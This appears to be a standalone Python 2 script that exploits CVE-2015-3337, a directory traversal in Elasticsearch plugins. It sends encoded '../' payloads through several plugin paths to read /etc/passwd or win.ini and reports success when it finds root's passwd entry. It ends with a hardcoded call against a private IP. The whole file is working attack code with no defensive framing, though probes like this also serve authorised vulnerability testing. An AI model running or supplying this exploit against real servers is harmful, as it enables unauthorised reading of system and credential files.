#-*- coding:utf-8 -*-  
  
import requests  
  
def elastic_directoryTraversal(host,port):  
    pluginList = ['test','kopf', 'HQ', 'marvel', 'bigdesk', 'head']  
    pList = ['/../../../../../../../../../../../../../../etc/passwd','/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd','/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini']  
    for p in pluginList:  
        for path in pList:  
            urlA = "http://%s:%d/_plugin/%s%s" % (host,port,p,path)  
            try:  
                content = requests.get(urlA,timeout=5,allow_redirects=True,verify=False).content  
                if "/root:/" in content:  
                    print 'Elasticsearch 任意文件读取漏洞(CVE-2015-3337) Found!'  
            except Exception,e:  
                print e  
   
elastic_directoryTraversal('192.168.168.23',9200)
